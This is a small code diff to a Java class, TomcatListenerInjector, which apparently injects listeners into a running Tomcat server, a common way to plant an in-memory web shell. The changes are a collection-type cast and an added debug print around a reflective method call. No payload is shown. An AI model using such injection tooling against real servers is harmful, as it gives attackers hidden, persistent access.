@@ -94,7 +94,7 @@ public class TomcatListenerInjector {
             listeners.add(listener);
             System.out.println("listener inject successful");
         } else {
-            ArrayList arrayList = new ArrayList(Arrays.asList(objects));
+            List arrayList = new ArrayList(Arrays.asList(((Object[]) objects)));
             for (Object o : arrayList) {
                 if (o.getClass().getName().equals(getClassName())) {
                     System.out.println("listener already injected");
@@ -195,6 +195,7 @@ public class TomcatListenerInjector {
             }
 
             method.setAccessible(true);
+            System.out.println(method.getDeclaringClass().getName() + "@" + String.valueOf(obj.hashCode()).substring(0, 4) + "." + methodName + " invoked");
             return method.invoke(obj instanceof Class ? null : obj, param);
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
